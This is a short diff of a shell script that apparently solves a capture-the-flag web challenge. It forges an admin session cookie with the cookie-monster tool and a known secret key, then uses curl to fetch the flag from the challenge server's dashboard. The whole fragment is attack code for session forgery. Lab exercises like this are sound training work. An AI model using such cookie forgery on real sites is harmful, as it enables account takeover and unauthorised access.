@@ -40,5 +40,5 @@ git clone https://github.com/DigitalInterruption/cookie-monster && cd cookie-mon
 
 admin_cookies=$(cookie-monster -e -f new_cookie.json -k "$session_secret_key"| awk -F ' ' '/Cookie: / {print $4}'|sed -z 's/\x1b\[[0-9;]*m//g'|sed -z 's/\n/;/g')
 
-echo -n "$admin_cookies"
+# Log in as user admin and get the flag
 curl -qs "http://94.237.56.188:32416/dashboard" --cookie "$admin_cookies" --proxy "http://127.0.0.1:8080"|grep -i flag
